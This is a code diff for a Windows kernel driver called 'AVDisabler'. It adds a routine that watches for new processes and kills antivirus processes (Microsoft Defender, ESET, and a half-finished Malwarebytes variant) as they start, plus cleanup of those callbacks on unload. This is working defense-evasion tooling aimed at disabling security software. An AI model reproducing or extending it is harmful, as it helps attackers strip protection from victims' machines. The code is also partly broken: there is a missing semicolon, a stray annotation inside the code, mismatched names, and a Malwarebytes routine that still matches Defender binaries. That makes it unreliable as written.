@@ -35,7 +35,6 @@ void PreventDefenderProcessCreate(PEPROCESS Process,
 								  HANDLE ProcessId,
 								  PPS_CREATE_NOTIFY_INFO CreateInfo)
 {
-
 	NTSTATUS status = STATUS_SUCCESS;
 	HANDLE hProcess = nullptr;
 
@@ -82,7 +81,7 @@ void PreventEsetProcessCreate(PEPROCESS Process,
 
 	UNICODE_STRING ObOpenObjectByPointerFuncName = RTL_CONSTANT_STRING(L"ObOpenObjectByPointer");
 	fObOpenObjectByPointer ObOpenObjectByPointer = (fObOpenObjectByPointer)MmGetSystemRoutineAddress(&ObOpenObjectByPointerFuncName);
-	KdPrint(("[+]AVDisablerDriver::PreventDefenderProcessCreate: ObGetObjectByPointer address: 0x%p\n", ObGetObjectByPointer));
+	KdPrint(("[+]AVDisablerDriver::PreventEsetProcessCreate: ObGetObjectByPointer address: 0x%p\n", ObGetObjectByPointer));
 
 	// checking if the process being created is one of ESET's processes
 	// 
@@ -109,7 +108,49 @@ void PreventEsetProcessCreate(PEPROCESS Process,
 			return;
 		}
 
-		KdPrint(("[+] AVDisabler::PreventDefenderProcessCreate: process %d of %wZ was terminated successfully!!\n", HandleToUlong(ProcessId), CreateInfo->ImageFileName));
+		KdPrint(("[+] AVDisabler::PreventEsetProcessCreate: process %d of %wZ was terminated successfully!!\n", HandleToUlong(ProcessId), CreateInfo->ImageFileName));
+
+	}
+}
+
+void PreventMalwareBytesProcessCreate(PEPROCESS Process,
+	HANDLE ProcessId,
+	PPS_CREATE_NOTIFY_INFO CreateInfo)
+{
+
+	NTSTATUS status = STATUS_SUCCESS;
+	HANDLE hProcess = nullptr;
+
+	UNICODE_STRING ObOpenObjectByPointerFuncName = RTL_CONSTANT_STRING(L"ObOpenObjectByPointer");
+	fObOpenObjectByPointer ObOpenObjectByPointer = (fObOpenObjectByPointer)MmGetSystemRoutineAddress(&ObOpenObjectByPointerFuncName);
+	KdPrint(("[+]AVDisablerDriver::PreventMalwareBytesProcessCreate: ObGetObjectByPointer address: 0x%p\n", ObGetObjectByPointer));
+
+	// checking if the process being created is one of ESET's processes
+	// 
+	// ---------- !!!!!need to modify the processes' variables to ESET images names!!!!! ----------
+	if (RtlCompareUnicodeString(CreateInfo->ImageFileName, &DefenderMsMpEng, TRUE) == 0 ||
+		RtlCompareUnicodeString(CreateInfo->ImageFileName, &DefenderSecurityHealthService, TRUE) == 0 ||
+		RtlCompareUnicodeString(CreateInfo->ImageFileName, &DefenderSecurityHealthSystray, TRUE) == 0 ||
+		RtlCompareUnicodeString(CreateInfo->ImageFileName, &DefenderSecurityHealthHost, TRUE) == 0 ||
+		RtlCompareUnicodeString(CreateInfo->ImageFileName, &DefenderSecHealthUI, TRUE) == 0)
+	{
+		status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, nullptr, GENERIC_ALL, *PsProcessType, KernelMode, &hProcess);
+		if (!NT_SUCCESS(status))
+		{
+			KdPrint(("[-] AVDisabler::PreventMalwareBytesProcessCreate: Can't open handle to process. (NTSTATUS: 0x%x)\n", status));
+			return;
+		}
+
+		KdPrint(("[+] AVDisabler::PreventMalwareBytesProcessCreate: handle to %wZ was opened successfully!!\n", CreateInfo->ImageFileName));
+		status = ZwTerminateProcess(hProcess, STATUS_ACCESS_VIOLATION); //Check if there is a need to ObDerefernceObject the PEPROCESS to avoid memory leak
+		if (!NT_SUCCESS(status))
+		{
+			KdPrint(("[-] AVDisabler::PreventMalwareBytesProcessCreate: Can't terminate process (NTSTATUS: 0x%x)\n", status));
+			//ObCloseHandle(hProcess, 0);  <-- Might not be necessary
+			return;
+		}
+
+		KdPrint(("[+] AVDisabler::PreventMalwareBytesProcessCreated: process %d of %wZ was terminated successfully!!\n", HandleToUlong(ProcessId), CreateInfo->ImageFileName));
 
 	}
 }
@@ -152,6 +193,7 @@ NTSTATUS IOCTLHandlerDispatchRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 			}
 
 			status = PsSetCreateProcessNotifyRoutineEx(&PreventDefenderProcessCreate, FALSE);
+			
 			if (!NT_SUCCESS(status)) 
 			{
 				sprintf(OutputBuffer, "[-] AVDsiablerDriver::IOCTL_DISABLE_DEFENDER: Failed to set Defender's process creation callback routine\n (NTSTATUS: 0x%x)", status);
@@ -159,9 +201,8 @@ NTSTATUS IOCTLHandlerDispatchRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 				memcpy_s(SystemBuffer, OutputBufferLength, OutputBuffer, OutputBufferLength);
 				return CompleteRequest(status, Irp, sizeof(OutputBuffer));
 			}
-
+			g_IsDefenderCallbackRoutineSet = TRUE;
 			KdPrint(("[+] AVDsiablerDriver::IOCTL_DISABLE_DEFENDER: Process creation callback routine was created successfully!\n", status));
-
 		}
 
 		case IOCTL_DISABLE_ESET:
@@ -183,7 +224,7 @@ NTSTATUS IOCTLHandlerDispatchRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 				memcpy_s(SystemBuffer, OutputBufferLength, OutputBuffer, OutputBufferLength);
 				return CompleteRequest(status, Irp, 0);
 			}
-
+			g_IsEsetCallbackRoutineSet = TRUE;
 			KdPrint(("[+] AVDsiablerDriver::IOCTL_DISABLE_ESET: Process creation callback routine was created successfully!\n", status));
 
 		}
@@ -200,16 +241,16 @@ NTSTATUS IOCTLHandlerDispatchRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 
 			}
 
-			status = PsSetCreateProcessNotifyRoutineEx(&PreventEsetProcessCreate, FALSE);
+			status = PsSetCreateProcessNotifyRoutineEx(&PreventMalwareBytesProcessCreate, FALSE);
 			if (!NT_SUCCESS(status))
 			{
-				sprintf(OutputBuffer, "[-] AVDsiablerDriver::IOCTL_DISABLE_MALWAREBYTES: Failed to set Malwarebyte's related process creation callback routine\n (NTSTATUS: 0x%x)", status)
+				sprintf(OutputBuffer, "[-] AVDsiablerDriver::IOCTL_DISABLE_MALWAREBYTES: Failed to set MalwareByte's related process creation callback routine\n (NTSTATUS: 0x%x)", status)
 				KdPrint((OutputBuffer));
 				memcpy_s(SystemBuffer, OutputBufferLength, OutputBuffer, OutputBufferLength);
 				return CompleteRequest(status, Irp, 0);
 			}
-
-			KdPrint(("[+] AVDsiablerDriver::IOCTL_DISABLE_MALWAREBYTES: Process creation callback routine was created successfully!\n", status));
+			g_IsMalwareBytesCallbackRoutineSet = TRUE;
+			KdPrint(("[+] AVDisablerDriver::IOCTL_DISABLE_MALWAREBYTES: Process creation callback routine was created successfully!\n", status));
 		}
 	}
 
@@ -222,6 +263,27 @@ VOID UnloadRoutine(PDRIVER_OBJECT DriverObject)
 	PDEVICE_OBJECT DeviceObject = DriverObject->DeviceObject;
 	UNICODE_STRING DeviceSymlink = RTL_CONSTANT_STRING(L"\\??\\AVDisabler");
 
+	if(g_IsDefenderCallbackRoutineSet)
+	{
+		status = PsSetCreateProcessNotifyRoutineEx(&PreventDefenderProcessCreate, TRUE);
+		if (!NT_SUCCESS(status))
+			KdPrint(("[-] AVDsiablerDriver::UnloadRoutine: Failed to unset Defender's related process creation callback routine\n (NTSTATUS: 0x%x)", status));
+	}
+
+	if (g_IsEsetCallbackRoutineSet)
+	{
+		status = PsSetCreateProcessNotifyRoutineEx(&PreventEsetProcessCreate, TRUE);
+		if (!NT_SUCCESS(status))
+			KdPrint(("[-] AVDsiablerDriver::UnloadRoutine: Failed to unset ESET's related process creation callback routine\n (NTSTATUS: 0x%x)", status));
+	}
+
+	if (g_IsMalwareBytesCallbackRoutineSet)
+	{
+		status = PsSetCreateProcessNotifyRoutineEx(&PreventMalwareBytesProcessCreate, TRUE); <- needs to be defined first
+		if (!NT_SUCCESS(status))
+			KdPrint(("[-] AVDsiablerDriver::UnloadRoutine: Failed to unset MalwareBytes' related process creation callback routine\n (NTSTATUS: 0x%x)", status));
+	}
+
 	IoDeleteDevice(DeviceObject);
 	status = IoDeleteSymbolicLink(&DeviceSymlink);
 	if(!NT_SUCCESS(status))
@@ -230,6 +292,9 @@ VOID UnloadRoutine(PDRIVER_OBJECT DriverObject)
 		return;
 	}
 	KdPrint(("[+] AVDisablerDriver[Unload Routine]: unload routine executed successfully!\n"));
+
+
+	
 }
 
 extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
